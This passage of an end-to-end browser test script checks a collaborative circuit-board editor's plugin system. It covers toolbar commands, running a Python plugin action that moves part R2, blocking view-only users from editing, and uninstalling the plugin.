check('but its commands are in the menu and on the toolbar', ((await state(a)).py[ID] || []).length === 5 && (await a.locator(`.plg-tb-btn[data-uiact^="plugin:${ID}:"]`).count()) === 1);
const t1 = Date.now();
await a.click(`.plg-tb-btn[data-uiact="plugin:${ID}:${await act(a, 'Py: move R2')}"]`);
await a.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) > 1; return false; }, before.x, { timeout: 90000 });
check('the first click starts it and runs the command', (await frames(a)) === 1 && Math.abs((await fp(a, 'R2')).x - (before.x + 5)) < 1e-3);
console.log(`      (cold start to finished edit: ${Date.now() - t1} ms)`);
await idle(a, ID);

// ---- a viewer cannot change the board through a plugin
await db.query(`UPDATE permissions SET role = 'viewer' WHERE project_id = $1 AND user_id = $2`, [projectId, lee]);
await db.query(`INSERT INTO plugins (user_id, identifier, manifest, files, granted, enabled, source) SELECT $1, identifier, manifest, files, granted, true, source FROM plugins WHERE user_id = $2 AND identifier = $3`, [lee, dana, ID]);
await b.reload(); await editorReady(b);
const r2 = await fp(b, 'R2');
await b.evaluate(([i]) => { const s = window.KcPlugins.store.get(); const p = s.installed.find((x) => x.identifier === i); return p ? 1 : 0; }, [ID]);
await b.waitForFunction((i) => (window.KcPlugins.store.get().pyActions[i] || []).length === 5, ID, { timeout: 90000 });
await b.evaluate(([i, n]) => { const act = window.KcPlugins.store.get().pyActions[i].find((x) => x.name === n); window.KcPlugins.runUi(`plugin:${i}:${act.identifier}`); }, [ID, 'Py: move R2']);
await waitLog(b, ID, /view-only/, 60000).catch(() => {});
check('a viewer running the plugin changes nothing', JSON.stringify(await fp(b, 'R2')) === JSON.stringify(r2) && (await logOf(b, ID)).some((l) => /view-only/.test(l)), (await logOf(b, ID)).slice(-3).join(' | '));

// ---- uninstall
await a.evaluate(() => { window.confirm = () => true; });
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginDetail');
await a.click('#pluginUninstall');
await a.waitForFunction((i) => !window.KcPlugins.store.get().installed.some((p) => p.identifier === i), ID);
check('uninstalling stops the interpreter and removes its commands', (await frames(a)) === 0 && !(await state(a)).py[ID] && (await db.query('SELECT count(*)::int AS n FROM plugins WHERE user_id = $1', [dana])).rows[0].n === 0);
await a.click('#pluginManager .kd-x');

check('no page errors', errors.length === 0, errors.slice(0, 4).join(' | '));
await browser.close(); await db.end(); pcm.close();
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
